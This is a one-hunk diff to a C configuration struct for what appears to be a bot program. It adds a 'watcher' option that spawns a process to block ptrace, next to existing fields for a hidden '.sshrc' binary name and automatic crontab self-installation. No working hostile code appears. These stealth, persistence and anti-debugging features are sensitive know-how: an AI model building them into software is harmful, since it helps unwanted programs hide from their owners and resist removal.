@@ -37,6 +37,7 @@ typedef struct conf_b {
   char *binpath;        /* path to binary, ie: ~/ */
   char *binname;        /* binary name, ie: .sshrc */
   int autocron;         /* should the bot auto crontab itself? */
+  int watcher;		/* spawn a watcher pid to block ptrace? */
   char *comments;       /* we dont want to lose our comments now do we?! */
 } conf_t;
 
